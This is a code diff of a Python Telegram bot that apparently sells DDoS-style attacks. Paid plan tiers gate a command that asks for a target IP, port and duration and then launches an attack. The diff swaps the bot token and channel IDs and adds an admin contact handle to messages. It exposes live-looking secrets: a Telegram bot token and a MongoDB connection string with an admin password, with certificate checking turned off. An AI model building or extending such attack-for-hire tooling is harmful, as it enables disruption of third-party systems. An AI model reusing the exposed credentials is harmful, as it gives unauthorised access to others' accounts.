@@ -16,11 +16,11 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7311450065:AAG75zxiiD5M7OkRXMgkfH96Hnl5gck60Lk'
+TOKEN = '7437346079:AAEWJfRBsX0IsOfa_G8Vynx1F69GWcJDFPQ'
 MONGO_URI = 'mongodb+srv://admin:kpR4ObsewTySq48I@test.zeqrmgb.mongodb.net/test_db?retryWrites=true&w=majority&appName=piro&tlsAllowInvalidCertificates=true'
-FORWARD_CHANNEL_ID = -1002037296029
-CHANNEL_ID = 5674869424
-error_channel_id = -1002037296029
+FORWARD_CHANNEL_ID = -1002159088250
+CHANNEL_ID = -1002159088250
+error_channel_id = -1002159088250
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -172,18 +172,18 @@ def attack_command(message):
     try:
         user_data = users_collection.find_one({"user_id": user_id})
         if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.@raj14754*", parse_mode='Markdown')
             return
 
         if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
-            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.@raj14754*", parse_mode='Markdown')
             return
 
         if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
-            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.@raj14754*", parse_mode='Markdown')
             return
 
-        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.@raj14754*", parse_mode='Markdown')
         bot.register_next_step_handler(message, process_attack_command)
     except Exception as e:
         logging.error(f"Error in attack command: {e}")
@@ -197,7 +197,7 @@ def process_attack_command(message):
         target_ip, target_port, duration = args[0], int(args[1]), args[2]
 
         if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.@raj14754*", parse_mode='Markdown')
             return
 
         asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
@@ -252,7 +252,7 @@ def handle_message(message):
             response = "*No account information found. Please contact the administrator.@raj14754*"
         bot.reply_to(message, response, parse_mode='Markdown')
     elif message.text == "Help❓":
-        bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
+        bot.reply_to(message, "*Help selected @raj14754*", parse_mode='Markdown')
     elif message.text == "Contact admin✔️":
         bot.reply_to(message, "*Contact admin selected @raj14754*", parse_mode='Markdown')
     else:
